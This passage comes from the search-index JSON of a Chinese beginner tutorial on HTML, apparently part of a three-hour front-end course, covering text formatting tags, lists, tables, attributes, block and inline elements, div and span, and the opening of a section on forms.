<code>b</code>\uff0c\u53d6\u81ea bold\uff08adj. \u52a0\u7c97\u7684\uff09\uff0c\u5176\u4e0e <code>strong</code> \u6807\u7b7e\u7b49\u4ef7\u3002</p> <p>\u6587\u672c\u659c\u4f53\uff1a\u4f7f\u7528\u53cc\u6807\u7b7e <code>i</code>\uff0c\u53d6\u81ea italic\uff08adj. \u659c\u4f53\u7684\uff09\u3002</p> <p>\u6587\u672c\u4e0b\u5212\u7ebf\uff1a\u4f7f\u7528\u53cc\u6807\u7b7e <code>u</code>\uff0c\u53d6\u81ea\u4e0b\u5212\u7ebf\uff08underline\uff09\u3002</p> <p>\u6587\u672c\u5220\u9664\u7ebf\uff1a\u4f7f\u7528\u53cc\u6807\u7b7e <code>s</code>\uff0c\u53d6\u81ea\u5220\u9664\u7ebf\uff08strikethrough\uff0c\u4e5f\u79f0\u4e3a\u4e2d\u5212\u7ebf\uff09\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>del</code>.</p> <p>\u5982\u679c\u60f3\u8981\u6539\u53d8\u5b57\u4f53\u5927\u5c0f\uff0c\u8bf7\u627e CSS.</p> <p>\u65e0\u5e8f\u5217\u8868\uff1a\u4f7f\u7528\u53cc\u6807\u7b7e <code>ul</code>\uff0c\u53d6\u81ea\u65e0\u5e8f\u5217\u8868\uff08unordered list\uff09\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u53cc\u6807\u7b7e <code>dl</code>\uff08\u53d6\u81ea disorder list\uff09\uff0c\u5728\u8be5\u53cc\u6807\u7b7e\u5185\u4f7f\u7528\u53cc\u6807\u7b7e <code>li</code>\uff08\u53d6\u81ea list item\uff09\u6765\u5c55\u793a\u5176\u5217\u8868\u5185\u5bb9\u3002</p> <p>\u6709\u5e8f\u5217\u8868\uff1a\u4f7f\u7528\u53cc\u6807\u7b7e <code>ol</code>\uff0c\u53d6\u81ea\u6709\u5e8f\u5217\u8868\uff08ordered list\uff09\uff0c\u5176\u4f59\u540c\u65e0\u5e8f\u5217\u8868\u3002</p> <p>\u8868\u683c\uff1a\u6700\u5916\u5c42\u4f7f\u7528\u53cc\u6807\u7b7e <code>table</code>\uff0c\u63a5\u4e0b\u6765\u6bcf\u4e00\u884c\u4f7f\u7528 <code>tr</code> \u53cc\u6807\u7b7e\uff08table row\uff09\uff0c\u5728\u5176\u5185\u518d\u591a\u6b21\u4f7f\u7528 <code>td</code> \u6807\u7b7e\uff08table data\uff09\uff0c\u7279\u522b\u5730\uff0c\u5982\u679c\u8be5\u884c\u4f5c\u4e3a\u6807\u9898\u884c\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>th</code> \u53cc\u6807\u9898\uff08table header\uff09\u4ee3\u66ff <code>td</code>.</p> <p>\u8868\u683c\u8fb9\u6846\uff1a\u5728 <code>&lt;table&gt;&lt;/table&gt;</code> \u53cc\u6807\u7b7e\u4e2d\u7684\u5f00\u59cb\u6807\u7b7e\u4e2d\u6dfb\u52a0 <code>border</code> \u5c5e\u6027\uff1a<code>&lt;table border=\"1\"&gt;&lt;/table&gt;</code>\uff0c\u5176\u4e2d <code>1</code> \u8868\u793a\u8fb9\u6846\u5bbd\u5ea6\uff0c\u53ef\u4ee5\u6539\u6210\u5176\u4ed6\u6570\u5b57\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#html_3","title":"HTML \u6807\u7b7e\u5c5e\u6027","text":"<p>\u5c5e\u6027\u5728 HTML \u4e2d\u8d77\u5230\u5f88\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u7528\u4e8e\u5b9a\u4e49\u5143\u7d20\u7684\u884c\u4e3a\u548c\u5916\u89c2\uff0c\u4ee5\u53ca\u4e0e\u5176\u4ed6\u5143\u7d20\u7684\u5173\u7cfb\u3002</p> <p>\u57fa\u672c\u8bed\u6cd5\uff1a\uff08\u5c5e\u6027\u503c\u4e5f\u53ef\u4ee5\u7528\u5355\u5f15\u53f7\u62ec\u8d77\u6765\uff0c\u4f46\u662f\u60ef\u4f8b\u662f\u53cc\u5f15\u53f7\uff09</p> <pre><code>&lt;\u5f00\u59cb\u6807\u7b7e \u5c5e\u6027\u540d=\"\u5c5e\u6027\u503c\"&gt;&lt;/\u7ed3\u675f\u6807\u7b7e&gt;\n</code></pre> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u4f8b\u5b50\uff1a</p> <pre><code>&lt;p id=\"describe\" class=\"section\"&gt;\u8fd9\u662f\u4e00\u4e2a\u6bb5\u843d\u6807\u7b7e&lt;/p&gt;\n&lt;a href=\"http://www.baidu.com\"&gt;\u8fd9\u662f\u4e00\u4e2a\u8d85\u94fe\u63a5&lt;/a&gt;\n&lt;img src=\"example.jpg\" alt=\"\"&gt;&lt;/img&gt;\n</code></pre> <p>\u5c5e\u6027\u540d\u79f0\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u5c5e\u6027\u503c\u5927\u5c0f\u5199\u654f\u611f\u3002</p> <p>\u9002\u7528\u4e8e\u5927\u591a\u6570 HTML \u5143\u7d20\u7684\u5c5e\u6027\uff1a<code>class</code>\uff1a\u4e3a HTML \u5143\u7d20\u5b9a\u4e49\u4e00\u4e2a\u6216\u591a\u4e2a\u7c7b\u540d\uff08\u7c7b\u540d\u4ece\u6837\u5f0f\u6587\u4ef6\u4e2d\u5f15\u5165\uff09\uff0c<code>id</code>\uff1a\u5b9a\u4e49\u5143\u7d20\u552f\u4e00\u7684 ID\uff0c<code>style</code>\uff1a\u89c4\u5b9a\u5143\u7d20\u7684\u884c\u5185\u6837\u5f0f\uff0c\u8fd9\u51e0\u4e2a\u4e00\u822c\u4e0e CSS \u914d\u5408\u4f7f\u7528\u3002</p> <p><code>a</code> \u6807\u7b7e\uff1a<code>a</code> \u5e38\u7528\u4e8e\u8868\u793a\u8d85\u94fe\u63a5\uff0c\u5176\u4e2d\u53ef\u4ee5\u4f7f\u7528 <code>href</code> \u5c5e\u6027\uff1b\u8fd8\u53ef\u4ee5\u4f7f\u7528 <code>target</code> \u5c5e\u6027\uff0c\u6b64\u5c5e\u6027\u7528\u4e8e\u94fe\u63a5\u7684\u6253\u5f00\u65b9\u5f0f\uff0c\u5c5e\u6027\u503c\u5e38\u89c1\u56db\u79cd\uff1a<code>_blank</code>\u3001<code>_parent</code>\u3001<code>_self</code>\u3001<code>_top</code></p> <p><code>_blanck</code>\uff1a\u5728\u65b0\u6807\u7b7e\u9875\u6253\u5f00\u3002</p> <p><code>_parent</code>\uff1a\u5728\u7236\u7a97\u53e3/\u7236\u6846\u67b6\u4e2d\u6253\u5f00\u3002</p> <p><code>_self</code>\uff1a\u5728\u5f53\u524d\u6807\u7b7e\u9875\u6253\u5f00\u3002</p> <p><code>_top</code>\uff1a\u5728\u9876\u5c42\u7a97\u53e3/\u9876\u5c42\u6846\u67b6\u4e2d\u6253\u5f00\u3002</p> <p>\u6362\u884c\u6807\u7b7e\uff1a\u4f7f\u7528\u5355\u6807\u7b7e <code>br</code>\uff08line BReak\uff09\u3002</p> <p>\u6c34\u5e73\u5206\u5272\u7ebf\uff1a\u4f7f\u7528\u5355\u6807\u7b7e <code>hr</code>\uff08horizontal rule\uff09.</p> <p><code>img</code> \u6807\u7b7e\uff1a\u7528\u4e8e\u63d2\u5165\u56fe\u7247\uff0c\u5176\u4e2d\u4f7f\u7528 <code>src</code> \u5c5e\u6027\uff08source\uff09\uff0c\u5c5e\u6027\u503c\u4e3a\u56fe\u7247\u8def\u5f84\uff0c\u7edd\u5bf9\u8def\u5f84\u3001\u76f8\u5bf9\u8def\u5f84\u3001URL \u5747\u53ef\uff0c\u8fd8\u6709 <code>alt</code> \u5c5e\u6027\uff08alternative\uff09\uff0c\u8868\u793a\u56fe\u7247\u65e0\u6cd5\u52a0\u8f7d\u65f6\u7684\u66ff\u4ee3\u6587\u672c\uff0c\u53ef\u4ee5\u7559\u767d\uff1b<code>width</code> \u548c <code>height</code> \u5c5e\u6027\u8bbe\u7f6e\u56fe\u7247\u7684\u5bbd\u9ad8\uff0c\u53ef\u4ee5\u53ea\u8bbe\u5b9a\u4e00\u4e2a\uff0c\u53e6\u4e00\u4e2a\u81ea\u9002\u5e94\uff08\u7b49\u6bd4\u4f8b\u7f29\u653e\uff09\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#_4","title":"\u5757\u5143\u7d20\u4e0e\u884c\u5185\u5143\u7d20","text":"<p>\u6709\u7684\u5143\u7d20\u5728\u6d4f\u89c8\u5668\u663e\u793a\u4e2d\u72ec\u5360\u4e00\u884c\uff0c\u6709\u7684\u5219\u4e0d\u662f\uff0c\u8fd9\u5c31\u533a\u5206\u51fa\u4e86\u5757\u5143\u7d20\u4e0e\u884c\u5185\u5143\u7d20\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#block","title":"\u5757\u5143\u7d20\uff08block\uff09","text":"<p>\u5757\u5143\u7d20\u901a\u5e38\u7528\u4e8e\u7ec4\u7ec7\u548c\u5e03\u5c40\u9875\u9762\u7684\u4e3b\u8981\u7ed3\u6784\u548c\u5185\u5bb9\uff0c\u4f8b\u5982\u6bb5\u843d\u3001\u6807\u9898\u3001\u5217\u8868\u3001\u8868\u683c\u7b49\uff0c\u5b83\u4eec\u7528\u4e8e\u521b\u5efa\u9875\u9762\u7684\u4e3b\u8981\u90e8\u5206\uff0c\u5c06\u5185\u5bb9\u5206\u5272\u6210\u903b\u8f91\u5757\u3002</p> <p>\u5757\u5143\u7d20\u901a\u5e38\u4f1a\u4ece\u65b0\u884c\u5f00\u59cb\uff0c\u5e76\u5360\u636e\u6574\u884c\u7684\u5bbd\u5ea6\uff0c\u56e0\u6b64\u5b83\u4eec\u4f1a\u5728\u9875\u9762\u4e0a\u5448\u73b0\u4e3a\u4e00\u5757\u72ec\u7acb\u7684\u5185\u5bb9\u5757\u3002</p> <p>\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u5757\u5143\u7d20\u548c\u884c\u5185\u5143\u7d20\u3002</p> <p>\u5e38\u89c1\u7684\u5757\u5143\u7d20\u5305\u62ec <code>&lt;div&gt;</code>\u3001<code>&lt;p&gt;</code>\u3001<code>&lt;h1&gt;</code>-<code>&lt;h6&gt;</code>\u3001<code>&lt;ul&gt;</code>\u3001<code>&lt;ol&gt;</code>\u3001<code>&lt;li&gt;</code>\u3001<code>&lt;table&gt;</code>\u3001<code>&lt;form&gt;</code> \uff08\u8868\u5355\u6807\u7b7e\uff09\u7b49\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#inline","title":"\u884c\u5185\u5143\u7d20\uff08inline\uff09","text":"<p>\u884c\u5185\u5143\u7d20\u901a\u5e38\u7528\u4e8e\u6dfb\u52a0\u6587\u672c\u6837\u5f0f\u6216\u4e3a\u6587\u672c\u4e2d\u7684\u4e00\u90e8\u5206\u5e94\u7528\u6837\u5f0f\u3002\u5b83\u4eec\u53ef\u4ee5\u5728\u6587\u672c\u4e2d\u63d2\u5165\u5c0f\u7684\u5143\u7d20\uff0c\u4f8b\u5982\u8d85\u94fe\u63a5\u6216\u5f3a\u8c03\u6587\u672c\u7b49\u3002</p> <p>\u884c\u5185\u5143\u7d20\u901a\u5e38\u5728\u540c\u4e00\u884c\u5185\u5448\u73b0\uff0c\u4e0d\u4f1a\u72ec\u5360\u4e00\u884c\u3002</p> <p>\u5b83\u4eec\u53ea\u5360\u636e\u5176\u5185\u5bb9\u6240\u9700\u7684\u5bbd\u5ea6\uff0c\u800c\u4e0d\u662f\u6574\u884c\u7684\u5bbd\u5ea6\u3002</p> <p>\u884c\u5185\u5143\u7d20\u4e0d\u80fd\u5305\u542b\u5757\u5143\u7d20\uff0c\u4f46\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u884c\u5185\u5143\u7d20\u3002</p> <p>\u5e38\u89c1\u7684\u884c\u5185\u5143\u7d20\u5305\u62ec <code>&lt;span&gt;</code>\u3001<code>&lt;a&gt;</code>\u3001<code>&lt;strong&gt;</code>\u3001<code>&lt;em&gt;</code>\u3001<code>&lt;img&gt;</code>\u3001<code>&lt;br&gt;</code>\u3001<code>&lt;input&gt;</code>\uff08\u8f93\u5165\u6807\u7b7e\uff09 \u7b49\u3002</p>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#div-span","title":"<code>&lt;div&gt;</code> \u548c <code>&lt;span&gt;</code> \u6807\u7b7e","text":"<p><code>&lt;div&gt;</code> \u662f\u4e00\u4e2a\u5757\u7ea7\u7684\u53cc\u6807\u7b7e\uff0c\u901a\u5e38\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a\u53ef\u4ee5\u5305\u542b\u5176\u4ed6 HTML \u5143\u7d20\u7684\u5bb9\u5668\u5757\uff0c\u901a\u5e38\u65e0\u4efb\u4f55\u8bed\u610f\uff0c\u4ec5\u7528\u4e8e\u7ec4\u7ec7\u5185\uff0c\u6545\u800c\u7ecf\u5e38\u7528\u4e8e\u521b\u5efa\u9875\u9762\u7684\u5e03\u5c40\u7ed3\u6784\u3002\u521b\u5efa\u5757\u7ea7\u5bb9\u5668\u3002</p> <p>\u8fd9\u4e2a\u5e03\u5c40\u7ed3\u6784\u5305\u62ec\uff1a\u9875\u7709\u3001\u5bfc\u822a\u680f\u3001\u4fa7\u8fb9\u680f\u3001\uff08\u4e2d\u95f4\u7684\uff09\u5185\u5bb9\u533a\u57df\u3001\u9875\u89d2\u7b49\u7b49\u3002</p> <p><code>&lt;span&gt;</code> \u6807\u7b7e\u76f8\u5f53\u4e8e\u65e0\u7279\u6b8a\u6807\u7b7e\u7684 <code>&lt;a&gt;</code> \u4e0e <code>&lt;img&gt;</code>\uff0c\u4f5c\u7528\u662f\u628a\u4e00\u5c0f\u90e8\u5206\u6587\u672c\u5305\u88c5\u8d77\u6765\uff0c\u4ee5\u4fbf\u4e8e\u5bf9\u5176\u4f7f\u7528\u6837\u5f0f\u3001CSS \u6216 JS \u884c\u4e3a\u3002\u5185\u8054\u6837\u5f0f\u5316\u6587\u672c\u3002</p> <p>\u8fd9\u4e24\u4e2a\u6807\u7b7e\u901a\u5e38\u90fd\u4e0e CSS \u6216 JS \u4e00\u8d77\u4f7f\u7528\u3002</p> <p>\u5bfc\u822a\uff1anav\uff08navigator\uff09\u3001\u5bfc\u822a\u680f\uff1anav bar (navigator bar)</p> <p>\u5feb\u6377\u952e\uff1a\u300c<code>.name</code> + Tab\u300d/\u300c<code>div.name</code> + Tab\u300d\u2192\u300c<code>&lt;div class=\"name\"&gt;&lt;/div&gt;</code>\u300d\uff1b\u300c<code>#name</code> + Tab\u300d/\u300c<code>div#name</code> + Tab\u300d\u2192\u300c<code>&lt;div id=\"name\"&gt;&lt;/div&gt;</code>\u300d\uff1b</p> <p>\u793a\u4f8b\uff1a</p> <pre><code>...\n\n&lt;body&gt;\n  &lt;div class=\"nav\"&gt;\n    &lt;a href=\"#\"&gt;link 1&lt;/a&gt; \n    &lt;a href=\"#\"&gt;link 2&lt;/a&gt; \n    &lt;a href=\"#\"&gt;link 3&lt;/a&gt; \n    &lt;a href=\"#\"&gt;link 4&lt;/a&gt; \n    &lt;a href=\"#\"&gt;link 5&lt;/a&gt; \n  &lt;/div&gt;\n\n  &lt;div class=\"content\"&gt;\n    &lt;h1&gt;Title&lt;/h1&gt;\n    &lt;p&gt;contents&lt;/p&gt;\n    &lt;p&gt;contents&lt;/p&gt;\n    &lt;p&gt;contents&lt;/p&gt;\n    &lt;p&gt;contents&lt;/p&gt;\n    &lt;p&gt;contents&lt;/p&gt;\n  &lt;/div&gt;\n\n  &lt;span&gt;here's the first span tag&lt;/span&gt;\n  &lt;span&gt;here's the second span tag&lt;/span&gt;\n  &lt;span&gt;here's the third span tag&lt;/span&gt;\n  &lt;span&gt;here's the fourth span tag&lt;/span&gt;\n  &lt;hr&gt;\n  &lt;span&gt;clink the link here &lt;a href=\"#\"&gt;link&lt;/a&gt;&lt;/span&gt;\n&lt;/body&gt;\n</code></pre>"},{"location":"out_class_learning/quickly_learning/%E4%B8%89%E5%B0%8F%E6%97%B6%E5%89%8D%E7%AB%AF%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#html_4","title":"HTML \u8868\u5355","text":"<p>HTML \u8868\u5355\u7528\u4e8e\u6536\u96c6\u7528\u6237\u7684\u8f93\u5165\u4fe1\u606f\uff0c\u8868\u73b0\u4e3a\u4e00\u4e2a\u533a\u57df\uff0c\u5176\u5305\u542b\u4ea4\u4e92\u63a7\u4ef6\uff0c\u5c06\u7528\u6237\u6536\u96c6\u5230\u7684\u4fe1\u606f\u53d1\u9001\u5230 Web \u670d\u52a1\u5668\uff0c\u8fd9\u4e9b\u4ea4\u4e92\u63a7\u4ef6\u901a\u5e38\u4e3a\uff1a\u8f93\u5165\u5b57\u6bb5\u3001\u590d\u9009\u6846\u3001\u5355\u9009\u6309\u94ae\u3001\u4e0b\u62c9\u5217\u8868\u7b49\u3002</p> <p><code>&lt;form&gt;</code> \u6807\u7b7e\u662f\u8868\u5355\u7684\u5bb9\u5668\uff0c\u5176\u6709\u5f88\u591a\u5c5e\u6027\u3002</p>"}]}